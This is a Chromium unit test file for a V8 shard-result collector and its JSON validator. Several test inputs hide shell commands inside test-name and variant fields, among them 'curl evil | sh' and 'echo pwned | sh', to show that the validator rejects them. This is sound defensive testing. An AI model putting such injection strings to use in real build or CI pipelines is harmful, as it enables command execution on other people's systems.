# Copyright 2022 The Chromium Authors
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.

from __future__ import annotations

import collections
import collect_v8_task
import json
import unittest

from pyfakefs import fake_filesystem_unittest

# Minimal result of a failing test as required by the collector.
RESULT = {'name': 'mjsunit/foo', 'flags': ['--foo'], 'command': 'd8 --foo'}


class BadShardsTestCase(unittest.TestCase):
  def test_initiate_bad_shards(self):
    bad_shards = collect_v8_task.BadShards()
    self.assertEqual(bad_shards.missing, set())
    self.assertEqual(bad_shards.incomplete, set())

  def test_add_incomplete_shard(self):
    bad_shards = collect_v8_task.BadShards()
    bad_shards.add_incomplete('example')
    self.assertEqual(bad_shards.missing, set())
    self.assertEqual(bad_shards.incomplete, set(['example']))

  def test_add_missing_shard(self):
    bad_shards = collect_v8_task.BadShards()
    bad_shards.add_missing('example')
    self.assertEqual(bad_shards.missing, set(['example']))
    self.assertEqual(bad_shards.incomplete, set())

  def test_check_bad_shards_not_empty(self):
    bad_shards = collect_v8_task.BadShards()
    self.assertFalse(bad_shards.not_empty())
    bad_shards.add_missing('example')
    self.assertTrue(bad_shards.not_empty())

  def test_return_bad_shards_as_string(self):
    bad_shards = collect_v8_task.BadShards()
    bad_shards.add_incomplete('incomplete example')
    bad_shards.add_missing('missing example')
    self.assertEqual(bad_shards.as_str(), 'incomplete example, missing example')

  def test_return_missing_shards_count(self):
    bad_shards = collect_v8_task.BadShards()
    bad_shards.add_missing('example 1')
    bad_shards.add_missing('example 2')
    self.assertEqual(bad_shards.missing_count(), 2)


class AggregatedResultsTestCase(unittest.TestCase):
  def test_initiate_aggregated_results(self):
    aggregated_results = collect_v8_task.AggregatedResults(10)
    self.assertEqual(aggregated_results.slowest_tests, [])
    self.assertEqual(aggregated_results.results, [])
    self.assertEqual(aggregated_results.test_total, 0)
    self.assertEqual(aggregated_results.top_tests_cutoff, 10)

  def test_append_json_data(self):
    aggregated_results = collect_v8_task.AggregatedResults(10)
    self.assertEqual(aggregated_results.slowest_tests, [])
    self.assertEqual(aggregated_results.results, [])
    self.assertEqual(aggregated_results.test_total, 0)
    self.assertEqual(aggregated_results.top_tests_cutoff, 10)
    aggregated_results.append(
      {'slowest_tests': 'x', 'results': 'y', 'test_total': 1}
    )
    self.assertEqual(aggregated_results.slowest_tests, ['x'])
    self.assertEqual(aggregated_results.results, ['y'])
    self.assertEqual(aggregated_results.test_total, 1)
    self.assertEqual(aggregated_results.top_tests_cutoff, 10)

  def test_return_aggregated_tests_as_json(self):
    aggregated_results = collect_v8_task.AggregatedResults(10)
    aggregated_results.append(
      {
        'slowest_tests': [
          {'name': 'a', 'duration': 10},
          {'name': 'b', 'duration': 30},
          {'name': 'c', 'duration': 20},
        ],
        'results': 'y',
        'test_total': 3,
      }
    )
    self.assertEqual(
      aggregated_results.as_json(['tag 1', 'tag 3', 'tag 2']),
      {
        'max_rss_tests': [],
        'max_vms_tests': [],
        'slowest_tests': [
          {'duration': 30, 'name': 'b'},
          {'duration': 20, 'name': 'c'},
          {'duration': 10, 'name': 'a'},
        ],
        'results': ['y'],
        'test_total': 3,
        'tags': ['tag 1', 'tag 2', 'tag 3'],
      },
    )


class ValidateShardJsonTestCase(unittest.TestCase):
  def result(self, **overrides):
    return dict(
      {
        'name': 'mjsunit/foo',
        'flags': ['--random-seed=123', 'test/mjsunit/foo.js'],
        'command': 'out/build/d8 --random-seed=123 test/mjsunit/foo.js',
      },
      **overrides,
    )

  def output(self, results=None, **overrides):
    return dict(
      {
        'slowest_tests': [{'name': 'mjsunit/foo', 'duration': 0.5}],
        'results': [self.result()] if results is None else results,
        'test_total': 1,
      },
      **overrides,
    )

  def output_with_result(self, **overrides):
    return self.output(results=[self.result(**overrides)])

  def test_valid(self):
    for json_data in [
      {'slowest_tests': [], 'results': [], 'test_total': 0},
      self.output(),
      self.output(
        max_rss_tests=[{'name': 'mjsunit/foo', 'max_rss': 42}],
        max_vms_tests=[{'name': 'mjsunit/foo', 'max_vms': 0}],
      ),
      self.output_with_result(
        variant='stress',
        variant_flags=None,
        framework_name='standard_runner',
        shard_id=0,
        shard_count=2,
      ),
      # Number fuzzer.
      self.output_with_result(
        variant=None,
        variant_flags=['--flag1', '--flag2=42'],
        framework_name='num_fuzzer',
      ),
      # The number fuzzer also passes code with -e. Don't restrict this to
      # flags starting with two dashes.
      self.output_with_result(
        variant_flags=['-e', ' var __pv_0; var __pv_1;', '--stress-gc=4'],
        framework_name='num_fuzzer',
      ),
      # Shell meta characters are not rejected here, but quoted by the recipe.
      self.output_with_result(name='mjsunit/foo\'; echo pwned | sh #'),
      self.output_with_result(name='test262/intl402/Sch\u00f6n'),
    ]:
      with self.subTest(json_data=json_data):
        self.assertIsNone(collect_v8_task.validate_shard_json(json_data))

  def test_malformed_output(self):
    for json_data, error in [
      (['foo'], 'output is not a dict'),
      ({}, 'results is not a list'),
      (self.output(results={'name': 'foo'}), 'results is not a list'),
      ({'results': []}, 'test_total is not an int'),
      (self.output(test_total='1'), 'test_total is not an int'),
      (self.output(test_total=True), 'test_total is not an int'),
      (
        {'results': [], 'test_total': 0},
        'slowest_tests is not a list of tests with a numeric duration',
      ),
      (
        self.output(slowest_tests={'name': 'foo', 'duration': 1}),
        'slowest_tests is not a list of tests with a numeric duration',
      ),
      (
        self.output(slowest_tests=['foo']),
        'slowest_tests is not a list of tests with a numeric duration',
      ),
      (
        self.output(slowest_tests=[{'name': 'foo'}]),
        'slowest_tests is not a list of tests with a numeric duration',
      ),
      (
        self.output(slowest_tests=[{'name': 'foo', 'duration': '1'}]),
        'slowest_tests is not a list of tests with a numeric duration',
      ),
      (
        self.output(max_rss_tests=None),
        'max_rss_tests is not a list of tests with a numeric max_rss',
      ),
      (
        self.output(max_vms_tests=[{'name': 'foo', 'max_vms': None}]),
        'max_vms_tests is not a list of tests with a numeric max_vms',
      ),
    ]:
      with self.subTest(json_data=json_data):
        self.assertEqual(collect_v8_task.validate_shard_json(json_data), error)

  def test_malformed_result(self):
    for overrides, error in [
      ({'name': None}, '.name is not a plain string'),
      ({'name': ['foo']}, '.name is not a plain string'),
      ({'name': 'foo\nbar'}, '.name is not a plain string'),
      ({'name': 'foo\x1b[2Kbar'}, '.name is not a plain string'),
      ({'name': 'foo\u202ebar'}, '.name is not a plain string'),
      ({'name': ''}, '.name is empty or starts with a dash'),
      (
        {'name': '--command-prefix=sh -c \'echo pwned\''},
        '.name is empty or starts with a dash',
      ),
      ({'name': '-j1'}, '.name is empty or starts with a dash'),
      ({'command': None}, '.command is not a plain string'),
      ({'command': ['d8']}, '.command is not a plain string'),
      ({'command': 'd8\nFake line:'}, '.command is not a plain string'),
      ({'flags': None}, '.flags is not a list of plain strings'),
      ({'flags': '--flag'}, '.flags is not a list of plain strings'),
      ({'flags': ['--flag', 42]}, '.flags is not a list of plain strings'),
      (
        {'flags': ['--flag\nFake line:']},
        '.flags is not a list of plain strings',
      ),
      ({'variant': ['default']}, '.variant is not a plain string'),
      ({'variant': 'default\ncurl'}, '.variant is not a plain string'),
      (
        {'framework_name': {'foo': 'bar'}},
        '.framework_name is not a plain string',
      ),
      (
        {'variant_flags': '--flag'},
        '.variant_flags is not a list of plain strings',
      ),
      (
        {'variant_flags': ['--flag', 42]},
        '.variant_flags is not a list of plain strings',
      ),
      (
        {'variant_flags': ['--flag\n']},
        '.variant_flags is not a list of plain strings',
      ),
      ({'shard_id': '0\nFake line:'}, '.shard_id is not an int'),
      ({'shard_count': None}, '.shard_count is not an int'),
    ]:
      with self.subTest(overrides=overrides):
        self.assertEqual(
          collect_v8_task.validate_shard_json(
            self.output_with_result(**overrides)
          ),
          'results[0]' + error,
        )

  def test_malformed_result_index(self):
    self.assertEqual(
      collect_v8_task.validate_shard_json(self.output(results=['foo'])),
      'results[0] is not a dict',
    )
    self.assertEqual(
      collect_v8_task.validate_shard_json(
        self.output(results=[self.result(), self.result(variant=1)])
      ),
      'results[1].variant is not a plain string',
    )


class TaskCollectorTestCase(fake_filesystem_unittest.TestCase):
  def test_initiate_task_collector(self):
    task_collector = collect_v8_task.TaskCollector()
    self.assertEqual(task_collector.warnings, [])

  def test_emit_warnings(self):
    task_collector = collect_v8_task.TaskCollector()
    self.assertEqual(task_collector.warnings, [])
    task_collector.emit_warning(title='title example', log='log example')
    self.assertEqual(
      task_collector.warnings, [['title example', 'log example']]
    )

  def test_get_shards_info(self):
    self.setUpPyfakefs(allow_root_user=True)
    self.fs.create_file('/summary.json')

    summary_content = {"shards": ["a", "b", "c"]}
    with open('/summary.json', 'w') as f:
      json.dump(summary_content, f)

    task_collector = collect_v8_task.TaskCollector()
    shards = task_collector.get_shards_info(output_dir='/')
    self.assertEqual(shards, ['a', 'b', 'c'])

  def test_get_shards_info_without_file(self):
    task_collector = collect_v8_task.TaskCollector()
    self.assertEqual(task_collector.warnings, [])
    shards = task_collector.get_shards_info(output_dir='/')
    self.assertIsNone(shards)
    self.assertEqual(
      task_collector.warnings,
      [
        [
          'summary.json is missing or can not be read',
          'Something is seriously wrong with swarming_client/ or the bot.',
        ]
      ],
    )

  def test_merge_shard_results_without_shards(self):
    task_collector = collect_v8_task.TaskCollector()
    shard_results = task_collector.merge_shard_results(
      output_dir='/', shards=None, options=None
    )
    self.assertIsNone(shard_results)
    self.assertEqual(task_collector.warnings, [])

  def test_merge_shard_output(self):
    self.setUpPyfakefs(allow_root_user=True)
    self.fs.create_file('/123/example_shard.json')

    summary_content = {"result": "example result"}
    with open('/123/example_shard.json', 'w') as f:
      json.dump(summary_content, f)

    task_collector = collect_v8_task.TaskCollector()
    loaded_shard = task_collector.load_shard_json(
      output_dir='/', task_id='123', file_name='example_shard.json'
    )
    self.assertEqual(loaded_shard, {"result": "example result"})
    self.assertEqual(task_collector.warnings, [])

  def test_merge_shard_output_exception(self):
    task_collector = collect_v8_task.TaskCollector()
    loaded_shard = task_collector.load_shard_json(
      output_dir='/', task_id='123', file_name='example_shard.json'
    )
    self.assertIsNone(loaded_shard)
    self.assertEqual(task_collector.warnings, [])

  def create_json_file(self, name, content):
    self.fs.create_file(name)
    with open(name, 'w') as f:
      json.dump(content, f)

  def setup_shard_output(self, output1, output2):
    self.setUpPyfakefs(allow_root_user=True)
    self.create_json_file('/1/output.json', output1)
    self.create_json_file('/2/output.json', output2)

  def create_options(self):
    Options = collections.namedtuple('options', ['top_tests_cutoff'])
    return Options(top_tests_cutoff=10)

  def test_merge_shard_results_success(self):
    shards = [
      {
        'task_id': '1',
        'exit_code': 1,
      },
      {
        'task_id': '2',
        'exit_code': 0,
      },
    ]
    self.setup_shard_output(
      {
        'max_rss_tests': [{'name': 'foo', 'max_rss': 42}],
        'max_vms_tests': [{'name': 'foo', 'max_vms': 17}],
        'slowest_tests': [{'name': 'foo', 'duration': 0.1}],
        'results': [RESULT],
        'test_total': 1,
      },
      {
        'max_rss_tests': [{'name': 'bar', 'max_rss': 17}],
        'max_vms_tests': [{'name': 'bar', 'max_vms': 42}],
        'slowest_tests': [{'name': 'bar', 'duration': 2.4}],
        'results': [],
        'test_total': 1,
      },
    )
    task_collector = collect_v8_task.TaskCollector()
    merged_shard_result = task_collector.merge_shard_results(
      output_dir='/', shards=shards, options=self.create_options()
    )
    self.assertEqual(
      merged_shard_result,
      {
        'max_rss_tests': [
          {'name': 'foo', 'max_rss': 42},
          {'name': 'bar', 'max_rss': 17},
        ],
        'max_vms_tests': [
          {'name': 'bar', 'max_vms': 42},
          {'name': 'foo', 'max_vms': 17},
        ],
        'slowest_tests': [
          {'name': 'bar', 'duration': 2.4},
          {'name': 'foo', 'duration': 0.1},
        ],
        'results': [RESULT],
        'tags': [],
        'test_total': 2,
      },
    )
    self.assertEqual(task_collector.warnings, [])

  def check_second_shard_malformed(self, output, error):
    """Checks that malformed output of the second of two shards is dropped,
    while the output of the first shard is kept.
    """
    shards = [
      {'task_id': '1', 'exit_code': 1},
      {'task_id': '2', 'exit_code': 1},
    ]
    self.setup_shard_output(
      {'slowest_tests': [], 'results': [RESULT], 'test_total': 5}, output
    )
    task_collector = collect_v8_task.TaskCollector()
    merged_shard_result = task_collector.merge_shard_results(
      output_dir='/', shards=shards, options=self.create_options()
    )
    self.assertEqual(
      merged_shard_result,
      {
        'max_rss_tests': [],
        'max_vms_tests': [],
        'slowest_tests': [],
        'results': [RESULT],
        'tags': ['UNRELIABLE_RESULTS'],
        'test_total': 5,
      },
    )
    self.assertEqual(
      [warning[0] for warning in task_collector.warnings],
      [
        'shard 1 produced malformed output.json',
        'some shards did not complete: 1',
      ],
    )
    self.assertEqual(task_collector.warnings[0][1], error)

  def test_merge_shard_results_one_malformed_result(self):
    self.check_second_shard_malformed(
      {
        'slowest_tests': [],
        'results': [dict(RESULT, name='mjsunit/bar\ncurl evil | sh')],
        'test_total': 3,
      },
      'results[0].name is not a plain string',
    )

  def test_merge_shard_results_one_empty(self):
    self.check_second_shard_malformed({}, 'results is not a list')

  def test_merge_shard_results_one_without_totals(self):
    self.check_second_shard_malformed(
      {'results': []}, 'test_total is not an int'
    )

  def test_merge_shard_results_one_missing(self):
    shards = [{'task_id': '1', 'exit_code': 0}, None]
    self.setup_shard_output(
      {'slowest_tests': [], 'results': [], 'test_total': 5}, {}
    )
    task_collector = collect_v8_task.TaskCollector()
    merged_shard_result = task_collector.merge_shard_results(
      output_dir='/', shards=shards, options=self.create_options()
    )
    self.assertEqual(
      merged_shard_result,
      {
        'max_rss_tests': [],
        'max_vms_tests': [],
        'slowest_tests': [],
        'results': [],
        'tags': ['UNRELIABLE_RESULTS'],
        'test_total': 5,
      },
    )
    self.assertEqual(
      task_collector.warnings[0][0], 'some shards did not complete: 1'
    )

  def test_merge_shard_results_all_incomplete(self):
    shards = [
      {
        'task_id': '1',
        'exit_code': 2,
      },
      {
        'task_id': '2',
        'exit_code': 2,
      },
    ]
    self.setup_shard_output(
      {'slowest_tests': [], 'results': [], 'test_total': 3},
      {'slowest_tests': [], 'results': [], 'test_total': 4},
    )
    task_collector = collect_v8_task.TaskCollector()
    merged_shard_result = task_collector.merge_shard_results(
      output_dir='/', shards=shards, options=self.create_options()
    )
    self.assertEqual(
      merged_shard_result,
      {
        'max_rss_tests': [],
        'max_vms_tests': [],
        'slowest_tests': [],
        'results': [],
        'tags': ['UNRELIABLE_RESULTS'],
        'test_total': 7,
      },
    )
    self.assertEqual(
      task_collector.warnings[0][0], 'some shards did not complete: 0, 1'
    )


if __name__ == '__main__':
  unittest.main()
